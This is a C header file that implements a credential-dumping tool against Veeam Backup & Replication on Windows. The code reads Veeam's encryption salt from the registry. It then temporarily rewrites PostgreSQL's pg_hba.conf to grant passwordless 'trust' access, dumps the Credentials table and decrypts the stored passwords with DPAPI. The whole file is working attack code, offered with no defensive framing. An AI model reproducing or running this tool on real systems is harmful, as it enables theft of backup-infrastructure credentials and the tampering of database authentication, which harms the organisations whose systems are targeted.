/* veeam-backoops.h */

/*
 * Author: ripmeep
 * Date  : 13/09/2025
 */

#ifndef _VEEAM_BACKOOPS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>

/* Change these if needed */
#define PG_ROOT_PATH                "C:\\Program Files\\PostgreSQL\\15" /* Path to PostgreSQL install */
#define PG_USERNAME                 "postgres"                          /* Username to connect to the Veeam database as */
#define PG_HOST                     "localhost"                         /* Host of the PostgreSQL database (rarely needs changing) */
#define PG_DATABASE                 "VeeamBackup"                       /* Database name of the Veeam Credential store */

#define VEEAM_SALT_ROOT             HKEY_LOCAL_MACHINE
#define VEEAM_SALT_SUBKEY           "SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data" /* Registry key path of the EncryptionSalt key */
#define VEEAM_SALT_KEY              "EncryptionSalt"
#define VEEAM_ENCRYPTION_HEADER_LEN 37 /* 37 is the length of the header in Veeam's encrypted strings which we later discard */

#define SHOW_DESCRIPTION 0 /* Output the PostgreSQL "description" column to stdout */ 

typedef enum {
  PQ_CONNECTION_OK,
  PQ_CONNECTION_BAD
} PG_CONNECTION_STATUS;

typedef enum {
  PG_RES_EMPTY_QUERY,
  PG_RES_OK,
  PG_RES_TUPLE_OK,
  PG_RES_BAD
} PG_EXEC_STATUS;

/* libpq template functions */
typedef int (__cdecl *PQlibVersion_t)(void);

typedef struct PGconn PGconn;
typedef struct PGresult PGresult;

typedef PGconn* (__cdecl *PQconnectdb_t)(const char*);
typedef PG_CONNECTION_STATUS (__cdecl *PQstatus_t)(PGconn*);
typedef void (__cdecl *PQfinish_t)(PGconn*);
typedef PGresult* (__cdecl *PQexec_t)(PGconn*, const char*);
typedef PG_EXEC_STATUS (__cdecl *PQresultStatus_t)(PGresult*);
//typedef void (__cdecl *PQclear_t)(PGresult*);
typedef int (__cdecl *PQntuples_t)(PGresult*);
typedef char* (__cdecl *PQgetvalue_t)(PGresult*, int, int);

typedef struct {
  /* Main module handle to DLL */
  HMODULE           __mod;
  /* Function mappings */
  PQlibVersion_t    PQlibVersion;
  PQconnectdb_t     PQconnectdb;
  PQstatus_t        PQstatus;
  PQfinish_t        PQfinish;
  PQexec_t          PQexec;
  PQresultStatus_t  PQresultStatus;
  PQntuples_t       PQntuples;
  PQgetvalue_t      PQgetvalue;
  //PQclear_t         PQclear;
  /* PostgreSQL attributes */
  PGconn           *conn;
  PGresult         *res;
} libpq_t;

struct vb_credential {
  char *user_name;
  char *password;
  char *description;
  char *plaintext;

  struct vb_credential *next;
};

typedef struct {
  char                  pg_hba_path[MAX_PATH];      /* Path to pg_hba.conf */
  char                  pg_hba_path_copy[MAX_PATH]; /* Buffer for temporary config copy path */
  char                 *pg_hba_config;              /* New configuration */
  char                 *pg_hba_orig;                /* Original configuration (mem backup) */

  size_t                pg_hba_len;                 /* Length of configuration (used for orignal) */
  
  struct vb_credential *vbc;                        /* Database credential row values */

  unsigned char        *encryption_salt;            /* Encryption salt for encrypted Veeam credentials */
} vb_data_t;

static size_t vb_path(char *md, const char *root, const char *path, size_t len) {
  if (!root || !path)
    return 0;

  char *root_copy = strdup(root);
  
  if (!root_copy)
    return 0;

  memset(md, 0, len);
  snprintf(md, len,
           "%s%s%s",
           root_copy, (root_copy[strlen(root) - 1] == '/' || root_copy[strlen(root_copy) - 1] == '\\') ? "" : "\\",
           path);

  free(root_copy);

  return strlen(md);
}

static size_t vb_read_file(char **md, const char *path) {
  FILE *fptr = fopen(path, "rb");
  if (!fptr)
    return 0;

  long len = 0;
  fseek(fptr, 0, SEEK_END);
  len = ftell(fptr);
  rewind(fptr);

  if (len <= 0) {
    fclose(fptr);
    return 0;
  }

  *md = (char*)malloc(len + 1);
  if (!(*md))
    return 0;

  memset(*md, 0, len + 1);

  size_t ret = fread(*md, 1, len, fptr);
  fclose(fptr);

  return ret;
}

static size_t vb_write_file(const char *path, const char *contents, size_t len) {
  FILE *fptr = fopen(path, "wb");
  if (!fptr)
    return 0;

  size_t ret = fwrite(contents, 1, len, fptr);
  fclose(fptr);

  return ret;
}

static DWORD vb_base64_decode(const char *enc, unsigned char **dec) {
  if (!enc || !dec)
    return 0;

  DWORD req = 0;
  if (!CryptStringToBinary(enc, 0, CRYPT_STRING_BASE64, NULL, &req, NULL, NULL))
    return 0;

  *dec = (unsigned char*)malloc(req + 1);
  if (!(*dec))
    return 0;

  memset(*dec, 0, req + 1);
  if (!CryptStringToBinary(enc, 0, CRYPT_STRING_BASE64, *dec, &req, NULL, NULL)) {
    free(*dec);
    return 0;
  }

  return req;
}

size_t vb_get_encryption_salt(unsigned char **md,
                              HKEY root, const char *subkey, const char *key) {
  if (!subkey || !key)
    return 0;

  HKEY h_key = 0;
  long r = -1;
  r = RegOpenKeyEx(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &h_key);

  if (r != ERROR_SUCCESS)
    return 0;

  DWORD t = 0, s = 0;
  r = RegQueryValueEx(h_key, key, NULL, &t, NULL, &s);
  if (r != ERROR_SUCCESS || (t != REG_SZ && t != REG_EXPAND_SZ)) {
    RegCloseKey(h_key);
    return 0;
  }

  *md = (unsigned char*)malloc(s + 1);
  if (!(*md)) {
    RegCloseKey(h_key);
    return 0;
  }

  memset(*md, 0, s + 1);
  r = RegQueryValueEx(h_key, key, NULL, NULL, (LPBYTE)*md, &s);
  RegCloseKey(h_key);

  if (r != ERROR_SUCCESS) {
    free(*md);
    return 0;
  }

  return (size_t)s;
}

struct vb_credential *vb_credential_add(struct vb_credential *vbc,
                                        char *user_name, char *password, char *description) {
  struct vb_credential *new = (struct vb_credential*)malloc(sizeof(struct vb_credential));
  if (!new)
    return NULL;

  new->user_name = strdup(user_name);
  if (!new->user_name) {
    free(new);
    return NULL;
  }

  new->password = strdup(password);
  if (!new->password) { 
    free(new->user_name);
    free(new);
    return NULL;
  }

  new->description = strdup(description);
  if (!new->description) {
    free(new->user_name);
    free(new->password);
    free(new);
    return NULL;
  }

  new->plaintext = NULL;
  new->next = NULL;

  if (!vbc)
    return new;

  struct vb_credential *tmp = vbc;
  while (1) {
    if (!tmp->next) {
      tmp->next = new;
      break; 
    }

    tmp = tmp->next;
  }

  return new;
}

DWORD vb_credential_decrypt(struct vb_credential *vbc, unsigned char *enc_salt) {
  if (!vbc || !enc_salt)
    return 0;

  unsigned char *dec_salt, *dec_password;
  DWORD dec_salt_len, dec_password_len;
  if (!(dec_salt_len = vb_base64_decode((const char*)enc_salt, &dec_salt)) || 
      !(dec_password_len = vb_base64_decode((const char*)vbc->password, &dec_password)))
    return 0;

  if (dec_password_len <= VEEAM_ENCRYPTION_HEADER_LEN) {
    SecureZeroMemory(dec_salt, dec_salt_len);
    SecureZeroMemory(dec_password, dec_password_len);
    free(dec_salt);
    free(dec_password);
    return 0;
  }

  unsigned char *ctx = dec_password + VEEAM_ENCRYPTION_HEADER_LEN;
  dec_password_len -= VEEAM_ENCRYPTION_HEADER_LEN;

  DATA_BLOB in_blob, entropy_blob, out_blob;
  in_blob.pbData = ctx;
  in_blob.cbData = dec_password_len;

  entropy_blob.pbData = dec_salt;
  entropy_blob.cbData = dec_salt_len;

  memset(&out_blob, 0, sizeof(out_blob));

  if (!CryptUnprotectData(&in_blob, NULL, &entropy_blob, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &out_blob)) {
    SecureZeroMemory(dec_salt, dec_salt_len);
    SecureZeroMemory(dec_password, dec_password_len);
    free(dec_salt);
    free(dec_password);
    return 0;
  }

  vbc->plaintext = (char*)malloc(out_blob.cbData + 1);
  if (!vbc->plaintext) {
    SecureZeroMemory(&in_blob, sizeof(in_blob));
    SecureZeroMemory(&out_blob, sizeof(out_blob));
    SecureZeroMemory(&entropy_blob, sizeof(entropy_blob));
    SecureZeroMemory(dec_salt, dec_salt_len);
    SecureZeroMemory(dec_password, dec_password_len);
    LocalFree(out_blob.pbData);
    free(dec_salt);
    free(dec_password);
    return 0;
  }

  memset(vbc->plaintext, 0, out_blob.cbData + 1);
  memcpy(vbc->plaintext, out_blob.pbData, out_blob.cbData); /* memcpy to avoid NULL bytes */

  SecureZeroMemory(&in_blob, sizeof(in_blob));
  SecureZeroMemory(&entropy_blob, sizeof(entropy_blob));
  SecureZeroMemory(&out_blob, sizeof(out_blob));
  SecureZeroMemory(dec_salt, dec_salt_len);
  SecureZeroMemory(dec_password, dec_password_len);
  LocalFree(out_blob.pbData);
  free(dec_salt);
  free(dec_password);

  return 1;
}

int vb_libpq_map(libpq_t *pq, char *out_path, size_t out_len) {
  if (!out_path) {
    out_len = MAX_PATH;
    char libpq_path[out_len];
    out_path = libpq_path;
  }

  vb_path(out_path, PG_ROOT_PATH, "bin", out_len); /* libpq.dll relies on certain other libraries
                                                      such as libcrypto(...).dll, libzstd.dll etc.
                                                      so we must add these to the DLL directory before
                                                      attempting to load libpq.dll */
  if (!SetDllDirectory(out_path))
    return GetLastError();

  /* Once the DLL directory has been set for deps, we can attempt to load libpq.dll */
  vb_path(out_path, out_path, "libpq.dll", out_len);

  pq->conn = NULL;
  pq->res = NULL;

  pq->__mod = LoadLibrary(out_path);
  if (!pq->__mod)
    return GetLastError();

  pq->PQlibVersion = (PQlibVersion_t)GetProcAddress(pq->__mod, "PQlibVersion");
  pq->PQconnectdb = (PQconnectdb_t)GetProcAddress(pq->__mod, "PQconnectdb");
  pq->PQstatus = (PQstatus_t)GetProcAddress(pq->__mod, "PQstatus");
  pq->PQfinish = (PQfinish_t)GetProcAddress(pq->__mod, "PQfinish");
  pq->PQexec = (PQexec_t)GetProcAddress(pq->__mod, "PQexec");
  pq->PQresultStatus = (PQresultStatus_t)GetProcAddress(pq->__mod, "PQresultStatus");
  pq->PQntuples = (PQntuples_t)GetProcAddress(pq->__mod, "PQntuples");
  pq->PQgetvalue = (PQgetvalue_t)GetProcAddress(pq->__mod, "PQgetvalue");

  if (!pq->PQlibVersion || !pq->PQconnectdb || !pq->PQstatus ||
      !pq->PQfinish || !pq->PQexec || !pq->PQresultStatus ||
      !pq->PQntuples || !pq->PQgetvalue)
    return GetLastError();

  return 0;
}

int vb_libpq_connect(libpq_t *pq) {
  if (!pq || !pq->PQconnectdb || !pq->PQstatus)
    return 0;

  /* Base allocation of 64 for safe buffer */
  char cs[64 + strlen(PG_HOST) + strlen(PG_DATABASE) + strlen(PG_USERNAME)];
  memset(cs, 0, sizeof(cs));
  snprintf(cs, sizeof(cs),
           "host=%s dbname=%s user=%s",
           PG_HOST, PG_DATABASE, PG_USERNAME);

  pq->conn = pq->PQconnectdb(cs);

  return pq->PQstatus(pq->conn) == (int)PQ_CONNECTION_OK;
}

void vb_libpq_free(libpq_t *pq) {
  if (!pq || /*!pq->PQclear ||*/ !pq->PQfinish)
    return;

  //if (pq->res)
  //  pq->PQclear(pq->res);
  
  if (pq->conn)
    pq->PQfinish(pq->conn);

  if (!pq->__mod)
    return;

  FreeLibrary(pq->__mod);
}

int vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
  if (!vb_data)
    return 0;

  vb_path(vb_data->pg_hba_path, PG_ROOT_PATH, "data\\pg_hba.conf", sizeof(vb_data->pg_hba_path));

  if (!(vb_data->pg_hba_len = vb_read_file(&vb_data->pg_hba_orig, vb_data->pg_hba_path)))
    return 0;

  size_t config_len = 128 + (strlen(PG_DATABASE) * 2) + (strlen(PG_USERNAME) * 2); /* 128 for enough buffer for base config length */
  vb_data->pg_hba_config = (char*)malloc(config_len);
  if (!vb_data->pg_hba_config)
    return 0;

  memset(vb_data->pg_hba_config, 0, config_len);

  snprintf(vb_data->pg_hba_config, config_len,
           "host\t%s\t%s\t::1/128\ttrust\nhost\t%s\t%s\t127.0.0.1/32\ttrust\nhost\tall\tall\t127.0.0.1/32\tmd5",
           PG_DATABASE, PG_USERNAME, PG_DATABASE, PG_USERNAME);

  snprintf(vb_data->pg_hba_path_copy, sizeof(vb_data->pg_hba_path_copy),
           "%s.backoop",
           vb_data->pg_hba_path);

  if (!CopyFile(vb_data->pg_hba_path, vb_data->pg_hba_path_copy, FALSE)) /* FALSE sets overwrite flag */
    return 0;

  if (!vb_write_file(vb_data->pg_hba_path, vb_data->pg_hba_config, strlen(vb_data->pg_hba_config)))
    return 0;

  return 1;
}

int vb_data_pg_hba_restore(vb_data_t *vb_data) {
  return vb_data && ((int)MoveFileEx(vb_data->pg_hba_path_copy, vb_data->pg_hba_path, MOVEFILE_REPLACE_EXISTING) != 0);
}

void vb_data_free(vb_data_t *vb_data) {
  if (!vb_data)
    return;

  free(vb_data->pg_hba_config);
  free(vb_data->pg_hba_orig);
  free(vb_data->encryption_salt);

  if (vb_data->vbc) {
    struct vb_credential *cur = vb_data->vbc, *tmp;
    while (cur) {
      tmp = cur;
      cur = cur->next;
      free(tmp->user_name);
      free(tmp->password);
      free(tmp->description);
      free(tmp->plaintext);
      free(tmp);
    }
  }
}

int vb_get_credentials(libpq_t *pq, struct vb_credential **vbc) {
  if (!pq || !pq->PQexec || !pq->PQresultStatus || !pq->PQntuples)
    return 0;

  pq->res = pq->PQexec(pq->conn, "SELECT user_name,password,description FROM Credentials");

  if ((int)pq->PQresultStatus(pq->res) != PG_RES_TUPLE_OK)
    return 0;

  int rows = pq->PQntuples(pq->res), ret;
  if (!rows)
    return 0;

  ret = 0;

  for (int r = 0; r < rows; r++) {
    char *user_name   = pq->PQgetvalue(pq->res, r, 0),
         *password    = pq->PQgetvalue(pq->res, r, 1),
         *description = pq->PQgetvalue(pq->res, r, 2);

    /* Only care about the credentials with a password */
    if (strlen(password) > 0) {
      if (!ret) *vbc = vb_credential_add(NULL, user_name, password, description);
      else vb_credential_add(*vbc, user_name, password, description);
      ret++;
    }
  }

  return ret;
}

#define _VEEAM_BACKOOPS_H
#endif
